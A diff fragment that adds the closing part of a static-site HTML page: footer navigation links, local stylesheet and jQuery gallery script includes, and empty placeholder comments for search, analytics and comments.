+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+</body>
+</html>
+<!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+<!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
